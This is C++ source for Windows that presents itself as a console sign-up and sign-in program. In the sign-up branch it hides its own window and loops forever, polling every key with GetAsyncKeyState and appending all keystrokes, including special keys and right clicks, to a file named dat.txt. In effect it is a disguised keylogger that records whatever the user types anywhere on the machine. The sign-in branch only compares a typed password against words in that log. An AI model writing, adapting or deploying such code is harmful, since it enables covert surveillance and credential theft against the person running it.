#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;

void LOG(string input)
{
    fstream LogFile;
    LogFile.open("dat.txt", fstream::app);
    if (LogFile.is_open())
    {
        LogFile << input;
        LogFile.close();
    }
}

bool SpecialKeys(int S_Key)
{
    switch (S_Key)
    {
    case VK_SPACE:
        cout << " ";
        LOG(" ");
        return true;
    case VK_RETURN:
        cout << "\n";
        LOG("\n");
        return true;
    case '¾':
        cout << ".";
        LOG(".");
        return true;
    case VK_SHIFT:
        cout << "#SHIFT#";
        LOG("#SHIFT#");
        return true;
    case VK_BACK:
        cout << "\b";
        LOG("\b");
        return true;
    case VK_RBUTTON:
        cout << "#R_CLICK#";
        LOG("#R_CLICK#");
        return true;
    case VK_CAPITAL:
        cout << "#CAPS_LOCK#";
        LOG("#CAPS_LOCK");
        return true;
    case VK_TAB:
        cout << "#TAB";
        LOG("#TAB");
        return true;
    case VK_UP:
        cout << "#UP";
        LOG("#UP_ARROW_KEY");
        return true;
    case VK_DOWN:
        cout << "#DOWN";
        LOG("#DOWN_ARROW_KEY");
        return true;
    case VK_LEFT:
        cout << "#LEFT";
        LOG("#LEFT_ARROW_KEY");
        return true;
    case VK_RIGHT:
        cout << "#RIGHT";
        LOG("#RIGHT_ARROW_KEY");
        return true;
    case VK_CONTROL:
        cout << "#CONTROL";
        LOG("#CONTROL");
        return true;
    case VK_MENU:
        cout << "#ALT";
        LOG("#ALT");
        return true;
    default:
        return false;
    }
}
int main()
{
    cout << " 1 : For Sign Up";
    cout << "\n 2 : For Sign In";
    int a;
    cout << "\nEnter your choice:";
    cin >> a;
    if (a == 1)
    {
        system("CLS");
        string s;
        cout << "Enter your name :";
        cin >> s;
        cout << "Enter the password ";
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        char KEY = 'x';
        while (true)
        {
            for (int KEY = 8; KEY <= 190; KEY++)
            {
                if (GetAsyncKeyState(KEY) == -32767)
                {
                    if (SpecialKeys(KEY) == false)
                    {
                        fstream LogFile;
                        LogFile.open("dat.txt", fstream::app);
                        if (LogFile.is_open())
                        {
                            LogFile << char(KEY);
                            LogFile.close();
                        }
                    }
                }
            }
        }
    }
    if (a == 2)
    {
        system("CLS");
        ifstream indata;
        indata.open("dat.txt", ios::in);
        string m, s;
        int z = 1;
        system("CLS");
        cout << "Enter your password :";
        cin >> m;
        indata >> s;
        while (!indata.eof())
        {
            if (s == m)
            {
                cout << " Successfully login ";
                z = 0;
                return 0;
            }
            indata >> s;
        }
        cout << "login failed ";
        cout << "\nPlease enter correct password ";
    }
    return 0;
}